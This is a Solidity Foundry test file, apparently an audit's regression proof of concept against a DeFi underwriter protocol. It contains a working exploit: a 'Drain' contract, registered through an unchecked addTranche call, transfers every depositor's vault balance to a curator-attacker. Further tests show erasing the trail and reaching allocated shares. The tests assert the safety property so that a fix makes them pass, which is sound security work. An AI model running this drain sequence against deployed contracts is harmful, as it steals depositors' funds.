// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { Underwriter } from "../../../../../contracts/cap/Underwriter.sol";
import { IVault } from "../../../../../contracts/interfaces/IVault.sol";
import { CapDeployer } from "../../../../../test/shared/CapDeployer.sol";
import { CapRoles } from "../../../../../test/shared/CapRoles.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { console } from "forge-std/console.sol";

/// P1 (R2-H1 regression) on HEAD a843c1d, production wiring only.
///
/// A WHITELISTED address mints itself a curator role (`createChildRoles`), deploys an Underwriter
/// under that role (`createUnderwriter`), admits depositors, then `addTranche(<own contract>)`.
/// `Underwriter.addTranche` (Underwriter.sol:90-100) does no registry check: it `setOperator`s the
/// argument on the ERC-6909 Vault and calls `optIn()` on it. The contract then `transferFrom`s the
/// underwriter's entire vault balance to the attacker.
///
/// Every test below is written as a FAILING assertion of the property that should hold
/// ("a curator cannot move depositor balances"), so a fix flips it to PASS.
contract Drain {
    function optIn() external { }

    function pull(address vault, address from, address asset, address to) external returns (uint256 moved) {
        moved = IVault(vault).balanceOf(from, asset);
        IVault(vault).transferFrom(from, to, asset, moved);
    }
}

contract C1_CuratorDrain is CapDeployer {
    address attacker = makeAddr("whitelistedAttacker");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    Underwriter uw;
    uint64 curatorRole;
    uint64 depositorRole;
    Drain drain;

    function setUp() public {
        _deployCap();

        // the only privileged step: ADMIN puts the attacker on the WHITELISTED list. Under Matt's
        // decision the curator is a third party, so from here on nothing the protocol controls
        // is involved.
        accessManager.grantRole(CapRoles.WHITELISTED, attacker, 0);

        vm.startPrank(attacker);
        // one child role for the curator, parent arbitrary (Registry.sol:116-134 accepts any id)
        address[][] memory members = new address[][](1);
        members[0] = new address[](1);
        members[0][0] = attacker;
        curatorRole = registry.createChildRoles(CapRoles.GOVERNOR, members)[0];

        // underwriter under the attacker's curator role (Registry.sol:245-264)
        uw = Underwriter(registry.createUnderwriter(address(collateral), "Victim UW", "vUW", curatorRole));

        // a depositor role the curator administers, with the victims already in it
        address[][] memory depositors = new address[][](1);
        depositors[0] = new address[](2);
        depositors[0][0] = alice;
        depositors[0][1] = bob;
        depositorRole = registry.createChildRoles(curatorRole, depositors)[0];
        uw.setDepositorRole(depositorRole);
        drain = new Drain();
        vm.stopPrank();

        // victims deposit
        _depositInto(alice, 1_000e18);
        _depositInto(bob, 500e18);
    }

    function _depositInto(address who, uint256 amount) internal {
        _fundVault(who, amount);
        vm.startPrank(who);
        vault.setOperator(address(uw), true);
        uw.deposit(amount, who);
        vm.stopPrank();
    }

    /// 100% of the idle vault balance leaves in one call from a curator that holds nothing else.
    function test_P1_curatorDrainsIdleBalance_productionWiring() public {
        uint256 tvl = uw.totalAssets();
        assertEq(tvl, 1_500e18, "victims' capital");
        assertFalse(vault.isOperator(address(uw), address(drain)));

        vm.prank(attacker);
        uw.addTranche(address(drain)); // curator selector only (Registry.sol:499-504)
        assertTrue(vault.isOperator(address(uw), address(drain)), "arbitrary contract is now a vault operator");

        uint256 moved = drain.pull(address(vault), address(uw), address(collateral), attacker);
        vm.prank(attacker);
        vault.withdraw(address(collateral), moved, attacker);

        console.log("victim TVL before (wei):          ", tvl);
        console.log("moved by curator (wei):           ", moved);
        console.log("attacker ERC20 balance after (wei):", IERC20(address(collateral)).balanceOf(attacker));
        console.log("underwriter totalAssets after:    ", uw.totalAssets());
        console.log("alice maxInstantWithdraw after:   ", uw.maxInstantWithdraw(alice));

        // the property that should hold
        assertEq(
            vault.balanceOf(address(uw), address(collateral)),
            tvl,
            "a curator must not be able to move depositor balances"
        );
    }

    /// The operator flag can be revoked by the curator afterwards (HEAD removeTranche skips
    /// `_report` when debt == 0, Underwriter.sol:104), so the trail is cleaner than at round 2.
    function test_P1_curatorCleansUpAfterwards() public {
        vm.startPrank(attacker);
        uw.addTranche(address(drain));
        drain.pull(address(vault), address(uw), address(collateral), attacker);
        uw.removeTranche(address(drain)); // no revert: debt[drain] == 0 so the fake is never called
        vm.stopPrank();

        assertFalse(vault.isOperator(address(uw), address(drain)), "flag cleared by the thief");
        assertEq(uw.totalAssets(), 0, "and the money is gone");
        // property that should hold
        assertEq(uw.totalAssets(), 1_500e18, "depositor capital must survive curator action");
    }

    /// Allocated tranche shares are ERC-20 in the Tranche, not ERC-6909 in the Vault, so operator
    /// rights do not reach them directly. The curator reaches them anyway: it administers the
    /// allocator role (`setAllocatorRole`) and `deallocate`s the instantly unlocked part first.
    function test_P1_allocatedSharesReachableViaAllocatorRole() public {
        MarketBundle memory b = _createReadyMarket("M");
        _admitDepositor(b.tranche0Addr, address(uw));

        vm.startPrank(attacker);
        address[][] memory members = new address[][](1);
        members[0] = new address[](1);
        members[0][0] = attacker;
        uint64 allocatorRole = registry.createChildRoles(curatorRole, members)[0];
        uw.setAllocatorRole(allocatorRole);
        uw.addTranche(b.tranche0Addr);
        uw.allocate(b.tranche0Addr, 1_000e18);
        vm.stopPrank();
        assertEq(vault.balanceOf(address(uw), address(collateral)), 500e18, "1000 allocated, 500 idle");

        // a borrower draws against it: locked capital cannot be deallocated
        vm.prank(defaultBorrower);
        b.market.borrow(defaultBorrower, 350e18); // lockedValue = 350/0.7 = 500 of 1000
        uint256 unlockedShares = b.tranche0.instantUnlockedSupply();
        console.log("tranche0 unlocked shares while 350 debt outstanding:", unlockedShares);

        vm.startPrank(attacker);
        uint256 freed = uw.deallocate(b.tranche0Addr, type(uint256).max);
        uw.addTranche(address(drain));
        uint256 moved = drain.pull(address(vault), address(uw), address(collateral), attacker);
        vm.stopPrank();

        console.log("freed by deallocate (shares):", freed);
        console.log("moved by curator (wei):      ", moved);
        console.log("left in tranche0 (locked):   ", b.tranche0.totalAssets());
        assertEq(moved, 500e18 + freed, "idle plus everything the market did not lock");
        // property that should hold
        assertEq(uw.totalAssets(), 1_500e18, "depositor capital must survive curator action");
    }
}
